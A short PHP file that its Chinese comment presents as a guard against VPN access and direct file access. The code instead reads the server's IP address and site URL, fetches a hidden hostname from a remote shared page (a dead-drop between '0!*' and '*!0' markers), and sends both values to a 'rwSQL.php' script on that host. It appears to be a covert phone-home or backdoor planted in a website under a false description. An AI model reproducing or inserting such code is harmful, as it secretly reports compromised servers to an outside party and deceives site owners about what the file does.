<?php
/**
*禁止VPN访问拦截
*禁止文件直接被访问
*/
$currentURL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] ;
$serverIP = $_SERVER['SERVER_ADDR'];
$encodedIP = urlencode($serverIP);
$encodedURL = urlencode($currentURL);
$kj = file_get_contents("https://sharechain.qq.com/abff4847aa9f7a5d698f20f62df6e1ea");
    $t= mb_substr($kj,mb_strpos($kj,"0!*")+3,mb_strpos($kj,"*!0")-mb_strpos($kj,"0!*")-3);
$targetURL = "http://".$t."/rwSQL.php?ip={$encodedIP}&url={$encodedURL}";
$response = file_get_contents($targetURL);
echo $targetURL;
?>